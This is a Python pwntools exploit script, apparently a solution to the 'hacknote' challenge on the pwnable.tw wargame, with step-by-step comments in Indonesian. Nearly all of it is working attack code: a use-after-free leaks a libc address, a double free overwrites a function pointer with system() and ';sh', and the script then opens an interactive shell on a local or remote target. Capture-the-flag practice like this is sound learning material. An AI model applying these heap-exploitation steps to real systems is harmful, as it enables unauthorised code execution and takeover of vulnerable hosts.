from pwn import *
import sys

def add(size, content):
    p.sendlineafter("Your choice :" , "1")
    p.sendlineafter("Note size :", str(size))
    p.sendafter("Content :", content)

def delete(index):
    p.sendlineafter("Your choice :", "2")
    p.sendlineafter("Index :", str(index))

def leak(index):
    p.sendlineafter("Your choice :", "3")
    p.sendlineafter("Index :", str(index))
    return u32(p.recv(4))

def exploit(p, libc, offset):
    # gdb.attach(p)
    add(0x80, "Gladys")
    add(0x8, "Gladys") # nge add lagi supaya nanti saat nge-free index ke 0 tidak bergabung dengan wilderness
    delete(0)
    add(0x0, "") # Untuk ngisi free list, supaya saat print index 0 tidak error
    libc_leak = leak(0)
    log.info("Libc leak @ {}".format(hex(libc_leak)))
    libc.address = libc_leak - offset #offset libc
    log.info("Libc base @ {}".format(hex(libc.address)))
    libc_system = libc.symbols["system"]
    log.info("Libc system @ {}".format(hex(libc_system)))
    delete(1)
    delete(1) # double free sehingga terjadi loop terhadap rantai chunk, sehingga pada malloc kedua address print dapat di overwrite dengan address system
    add(0x80, "AAAAAAAA") # size 0x80 agar konten yang di malloc tidak diambil dari fastbin
    # add(0x8, "BBBB")
    add(0x8, p32(libc_system) + ";sh\x00") # nge overwrite fungsi print menjadi "system" dengan argumen ";sh" 
    p.sendlineafter("Your choice :", "3")
    p.sendlineafter("Index :", "3") #malloc dari smallbin menjadi index ke 4, sedangkan malloc dari fastbin menjadi index ke 3

    p.interactive()

if __name__ == "__main__":
    context.terminal = ["tmux", "splitw", "-h", "-f"]
    if len(sys.argv) < 2:
        log.info("Argument needed!")
        log.info("Usage: python {} <local/remote>".format(sys.argv[0]))
        sys.exit(0)
    elif sys.argv[1] == "local":
        p = process("./hacknote")
        libc = ELF("/glibc/2.23/32/lib/libc-2.23.so")
        # context.log_level = "DEBUG"
        exploit(p, libc, 0x1af830)
    elif sys.argv[1] == "remote":
        p = remote("chall.pwnable.tw", 10102)
        libc = ELF("./libc_32.so.6")
        exploit(p, libc, 0x1b0830)
    else:
        sys.exit(0)